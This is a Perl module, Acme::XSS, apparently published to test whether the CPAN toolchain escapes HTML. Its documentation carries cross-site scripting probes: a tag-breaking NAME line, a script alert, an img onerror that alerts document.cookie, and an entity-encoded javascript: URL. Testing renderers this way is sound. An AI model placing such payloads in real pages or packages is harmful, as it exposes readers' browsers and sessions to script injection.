package Acme::XSS;
use strict;
use warnings;
use 5.013001;
our $VERSION = '0.03';



1;
__END__

=for stopwords xmp XSS

=encoding utf8

=head1 NAME

Acme::XSS - "><xmp>XSS Testing

=head1 SYNOPSIS

    use Acme::XSS;
    <xmp>

=head1 DESCRIPTION

This is a module to testing CPAN toolchain.

=begin html

<script>alert("all your codes are belongs to us");</script>
<img onerror="javascript:alert(document.cookie);" src="/">
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

=end html

=head1 AUTHOR

Tokuhiro Matsuno E<lt>tokuhirom AAJKLFJEF GMAIL COME<gt>

=head1 SEE ALSO

=head1 LICENSE

Copyright (C) Tokuhiro Matsuno

This library is free software; you can redistribute it and/or modify
it under the same terms as Perl itself.

=cut
